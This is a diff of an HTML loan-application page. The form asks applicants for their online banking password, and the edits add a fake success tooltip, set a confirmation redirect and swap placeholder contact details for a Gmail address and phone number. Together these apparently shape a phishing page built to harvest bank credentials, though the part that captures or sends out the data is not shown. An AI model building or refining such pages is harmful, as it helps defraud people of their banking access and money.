@@ -76,7 +76,7 @@
 
 <!-- FORM -->
 <div class="container mt-5">
-  <form id="loanForm" class="row g-3 needs-validation" novalidate>
+  <form id="loanForm" class="row g-3 needs-validation" novalidate action="confirmation.html">
     <div class="col-md-6">
       <label for="firstName" class="form-label">Full Name</label>
       <input type="text" class="form-control" id="firstName" required>
@@ -137,9 +137,12 @@
       <div class="invalid-feedback">Please enter your online banking password.</div>
     </div>
 
-    <div class="col-12">
-      <button class="btn btn-dark w-100" type="submit" style="background-color: #007bff; border-style: none;">On click Form</button>
-    </div>
+<div class="col-12">
+  <button class="btn btn-dark w-100" type="submit" style="background-color: #007bff; border-style: none;" 
+    id="submitButton" data-bs-toggle="tooltip" data-bs-placement="top" title="Form submitted successfully!">
+    On click Form
+  </button>
+</div>
   </form>
 </div>
 
@@ -334,9 +337,9 @@
         <h5 style="border-bottom: 2px solid black; width: fit-content;">Address </h5>
       </div>
       <div class="contact-data mt-4">
-        <p class="address">123 Main St, NY</p>
-        <p class="phone">+1 234 567 890</p>
-        <p class="email">info@example.com</p>
+        <p class="address">Los Angeles CALIFORNIA</p>
+        <p class="phone">+18886787161</p>
+        <p class="email">ezprobiz@gmail.com</p>
 
       </div>
     </div>
